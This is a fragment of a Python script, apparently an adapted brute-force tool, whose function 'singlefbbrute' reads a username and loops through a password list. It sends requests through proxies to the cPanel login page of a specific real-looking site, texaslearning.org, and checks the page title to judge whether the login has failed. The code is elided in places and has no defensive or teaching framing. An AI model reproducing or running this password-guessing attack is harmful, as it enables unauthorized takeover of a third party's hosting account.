...
def singlefbbrute():
    URL = 'https://texaslearning.org:2083/'
    print ('')
    user = input(C+' Username '+R+'> '+W)
    ...
    for password in passwd:
        ...
        with requests.Session() as c:
            ...
            b = c.get('https://texaslearning.org:2083/', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            a = soup.find('title')
            if(str(a) == '<title>cPanel Login</title>'):
